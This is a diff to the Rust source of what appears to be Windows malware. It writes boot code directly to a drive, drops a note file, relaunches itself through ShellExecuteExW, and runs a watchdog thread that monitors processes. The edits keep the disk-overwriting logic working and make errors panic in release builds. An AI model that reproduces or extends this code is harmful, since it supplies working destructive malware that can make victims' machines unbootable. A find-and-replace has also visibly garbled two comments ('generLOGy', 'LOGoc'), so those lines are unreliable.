@@ -23,6 +23,7 @@ use std::{
 };
 use windows::{
     core::{PCSTR, PCWSTR},
+    w,
     Win32::{
         Foundation::{
             GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND,
@@ -39,16 +40,14 @@ use windows::{
             Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
         },
         UI::{
-            Shell::{
-                ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW,
-            },
+            Shell::{ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW},
             WindowsAndMessaging::{
                 CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                 HCURSOR, HICON, HMENU, IDYES, MB_ICONWARNING, MB_YESNO, MSG, SM_CXSCREEN,
                 SM_CYSCREEN, SW_SHOWDEFAULT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
             },
         },
-    }, w,
+    },
 };
 
 fn main() -> Result<(), WinError> {
@@ -71,8 +70,8 @@ fn main() -> Result<(), WinError> {
     };
 
     if arg == "/watchdog" {
-        let watchdog_thread = thread::spawn(watchdog_thread);
-        watchdog_thread.join().unwrap().unwrap();
+        thread::spawn(watchdog_thread);
+        // watchdog_thread.join().unwrap().unwrap();
 
         let c: WNDCLASSEXA = WNDCLASSEXA {
             cbSize: size_of::<WNDCLASSEXA>() as u32,
@@ -118,13 +117,13 @@ fn main() -> Result<(), WinError> {
                 if !TranslateMessage(&msg).as_bool() {
                     write_log(
                         LogType::ERROR,
-                        LogLocation::ALL,
+                        LogLocation::LOG,
                         "Failed TranslateMessage()\nError: message is not translated",
                     );
                     return Err(WinError::Failed);
                 };
 
-                DispatchMessageA(&msg); // return value generally is ignored
+                DispatchMessageA(&msg); // return value generLOGy is ignored
             };
         }
     } else {
@@ -144,7 +143,7 @@ fn main() -> Result<(), WinError> {
             process::exit(0);
         }
 
-        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
+        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // LOGoc 8192 * 2
         wrap_get_module_file_name(HMODULE::default(), &mut fn_buf)?;
 
         let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
@@ -177,11 +176,7 @@ fn main() -> Result<(), WinError> {
         unsafe {
             if ShellExecuteExW(&mut info).as_bool() {
                 #[cfg(feature = "DEBUG_MODE")]
-                write_log(
-                    LogType::INFO,
-                    LogLocation::MSG,
-                    "ShellExecuteExW successed"
-                );
+                write_log(LogType::INFO, LogLocation::MSG, "ShellExecuteExW successed");
             } else {
                 #[cfg(feature = "DEBUG_MODE")]
                 write_log(
@@ -192,6 +187,7 @@ fn main() -> Result<(), WinError> {
                         GetLastError()
                     ),
                 );
+                #[cfg(not(feature = "DEBUG_MODE"))]
                 panic!(
                     "Failed ShellExecuteExW()\nGetLastError: {:?}",
                     GetLastError()
@@ -222,15 +218,10 @@ fn main() -> Result<(), WinError> {
     let mut wb: DWORD = Default::default();
 
     if !unsafe { WriteFile(drive, Some(&boot_code), Some(&mut wb), None).as_bool() } {
-        #[cfg(not(feature = "DEBUG_MODE"))]
-        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
-            GetLastError()
-        });
-
         #[cfg(feature = "DEBUG_MODE")]
         write_log(
             LogType::ERROR,
-            LogLocation::ALL,
+            LogLocation::LOG,
             &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                 GetLastError()
             }),
@@ -252,15 +243,10 @@ fn main() -> Result<(), WinError> {
     .unwrap();
 
     if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
-        #[cfg(not(feature = "DEBUG_MODE"))]
-        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
-            GetLastError()
-        });
-
         #[cfg(feature = "DEBUG_MODE")]
         write_log(
             LogType::ERROR,
-            LogLocation::ALL,
+            LogLocation::LOG,
             &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                 GetLastError()
             }),
@@ -298,7 +284,7 @@ fn watchdog_thread() -> Result<(), WinError> {
     {
         let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
         let data = data.replace("\0", "");
-        write_log(LogType::INFO, LogLocation::ALL, &data);
+        write_log(LogType::INFO, LogLocation::LOG, &data);
         sleep(Duration::from_millis(500));
     }
     sleep(Duration::from_millis(1000));
@@ -341,8 +327,8 @@ fn watchdog_thread() -> Result<(), WinError> {
                     proc.th32ProcessID
                 );
                 let sz_exe_file = format!("Process32First() proc.szExeFile: {}", file);
-                write_log(LogType::INFO, LogLocation::ALL, &th32_process_id);
-                write_log(LogType::INFO, LogLocation::ALL, &sz_exe_file);
+                write_log(LogType::INFO, LogLocation::LOG, &th32_process_id);
+                write_log(LogType::INFO, LogLocation::LOG, &sz_exe_file);
                 sleep(Duration::from_millis(500));
             }
         }
@@ -360,12 +346,14 @@ fn watchdog_thread() -> Result<(), WinError> {
                         Ok(handle) => Some(handle),
                         Err(e) => {
                             let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
+                            #[cfg(not(feature = "DEBUG_MODE"))]
+                            panic!("{}\n{e:?}\n", data);
+                            #[cfg(feature = "DEBUG_MODE")]
                             write_log(
                                 LogType::ERROR,
-                                LogLocation::ALL,
+                                LogLocation::LOG,
                                 &format!("{}\n{}\n", data, dbg!(&e)),
                             );
-                            None
                         }
                     };
                 }
@@ -414,11 +402,13 @@ fn watchdog_thread() -> Result<(), WinError> {
             }
 
             if proc.th32ProcessID == 0 {
+                #[cfg(feature = "DEBUG_MODE")]
                 write_log(
                     LogType::ERROR,
-                    LogLocation::ALL,
+                    LogLocation::LOG,
                     "Unable to open system process",
                 );
+                #[cfg(not(feature = "DEBUG_MODE"))]
                 panic!("Unable to open system process");
             }
 
@@ -429,8 +419,8 @@ fn watchdog_thread() -> Result<(), WinError> {
                 let th32_process_id =
                     format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                 let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
-                write_log(LogType::INFO, LogLocation::ALL, &th32_process_id);
-                write_log(LogType::INFO, LogLocation::ALL, &sz_exe_file);
+                write_log(LogType::INFO, LogLocation::LOG, &th32_process_id);
+                write_log(LogType::INFO, LogLocation::LOG, &sz_exe_file);
                 sleep(Duration::from_millis(500));
             }
         }
